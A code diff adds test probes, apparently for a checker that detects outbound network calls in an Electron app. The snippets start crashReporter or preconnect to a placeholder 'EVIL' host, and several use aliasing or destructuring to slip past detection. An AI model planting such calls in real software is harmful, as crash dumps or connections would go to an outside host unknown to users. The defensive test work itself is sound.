@@ -374,6 +374,85 @@ export const DESKTOP_PROBES: Probe[] = [
     code: `import { net as electronNet } from "electron";\nawait electronNet.fetch("${EVIL}");`,
     call: 'package "electron" (net)',
   },
+  // The crash reporter uploads crash dumps to the address it is started with.
+  {
+    what: "crashReporter.start, imported by name",
+    file: "desktop/main.mjs",
+    appendTo: true,
+    code: `import { crashReporter } from "electron";\ncrashReporter.start({ submitURL: "${EVIL}" });`,
+    call: `crashReporter.start({ submitURL: "${EVIL}" }`,
+  },
+  {
+    what: "crashReporter.start, imported under another name",
+    file: PROBE_FILE,
+    code: `import { crashReporter as reporter } from "electron";\nreporter.start({ submitURL: "${EVIL}" });`,
+    call: `crashReporter.start({ submitURL: "${EVIL}" }`,
+  },
+  {
+    what: "crashReporter.start, reached through the module",
+    file: PROBE_FILE,
+    code: `import electron from "electron";\nelectron.crashReporter.start({ submitURL: "${EVIL}" });`,
+    call: `crashReporter.start({ submitURL: "${EVIL}" }`,
+  },
+  {
+    what: "crashReporter.start, looked up by a string on a required module",
+    file: PROBE_FILE,
+    code: `const { crashReporter } = require("electron");\ncrashReporter["start"]({ submitURL: "${EVIL}" });`,
+    call: `crashReporter.start({ submitURL: "${EVIL}" }`,
+  },
+  { what: "crashReporter.start taken off its object", file: PROBE_FILE, code: `import { crashReporter } from "electron";\nconst begin = crashReporter.start;`, call: "crashReporter.start (used as a value)" },
+  { what: "crashReporter.start taken out by destructuring", file: PROBE_FILE, code: `import { crashReporter } from "electron";\nconst { start } = crashReporter;`, call: "crashReporter.start (used as a value)" },
+  {
+    what: "crashReporter.start handed on with .call",
+    file: PROBE_FILE,
+    code: `import { crashReporter } from "electron";\ncrashReporter.start.call(crashReporter, { submitURL: "${EVIL}" });`,
+    call: "crashReporter.start (used as a value)",
+  },
+  { what: "crashReporter handed to something else", file: PROBE_FILE, code: `import { crashReporter } from "electron";\nrunLater(crashReporter);`, call: "crashReporter (used as a value)" },
+  { what: "crashReporter re-exported", file: PROBE_FILE, code: `export { crashReporter } from "electron";`, call: "crashReporter (used as a value)" },
+  // session.preconnect opens connections to an address; session.resolveHost asks the DNS server about a name.
+  {
+    what: "session.preconnect on the default session",
+    file: "desktop/main.mjs",
+    appendTo: true,
+    code: `session.defaultSession.preconnect({ url: "${EVIL}", numSockets: 1 });`,
+    call: `session.preconnect({ url: "${EVIL}", numSockets: 1 }`,
+  },
+  {
+    what: "session.resolveHost on the default session",
+    file: "desktop/main.mjs",
+    appendTo: true,
+    code: `await session.defaultSession.resolveHost("example.invalid");`,
+    call: 'session.resolveHost("example.invalid"',
+  },
+  {
+    what: "session.resolveHost on a partition",
+    file: "desktop/main.mjs",
+    appendTo: true,
+    code: `await session.fromPartition("persist:x").resolveHost("example.invalid");`,
+    call: 'session.resolveHost("example.invalid"',
+  },
+  {
+    what: "session.preconnect on the window's own session",
+    file: "desktop/main.mjs",
+    appendTo: true,
+    code: `win.webContents.session.preconnect({ url: "${EVIL}" });`,
+    call: `session.preconnect({ url: "${EVIL}" }`,
+  },
+  {
+    what: "session.preconnect taken off a session held in a variable",
+    file: "desktop/main.mjs",
+    appendTo: true,
+    code: `const ses = session.defaultSession;\nconst warm = ses.preconnect;`,
+    call: "session.preconnect (used as a value)",
+  },
+  {
+    what: "session.resolveHost taken out by destructuring",
+    file: "desktop/main.mjs",
+    appendTo: true,
+    code: `const { resolveHost } = session.defaultSession;`,
+    call: "session.resolveHost (used as a value)",
+  },
 ];
 
 export const DESKTOP_QUIET: QuietProbe[] = [
@@ -400,6 +479,16 @@ export const DESKTOP_QUIET: QuietProbe[] = [
     file: "desktop/main.mjs",
     appendTo: true,
     code: `const [firstWindow] = BrowserWindow.getAllWindows();\nsession.defaultSession.setPermissionRequestHandler(() => {});`,
+  },
+  {
+    what: "crashReporter's methods that send nothing, and a start of the code's own",
+    file: PROBE_FILE,
+    code: `import { crashReporter } from "electron";\nconst last = crashReporter.getLastCrashReport();\ncrashReporter.addExtraParameter("build", "1");\nconst timer = { start() { return 1; } };\ntimer.start();\nconst { start } = timer;`,
+  },
+  {
+    what: "a preconnect or resolveHost of something that isn't an electron session",
+    file: PROBE_FILE,
+    code: `const pool = makePool();\npool.preconnect();\nconst { resolveHost } = pool;\nclass Dns { resolveHost() { return 1; } }\nconst table = { preconnect: 1, resolveHost: 2 };`,
   },
 ];
 
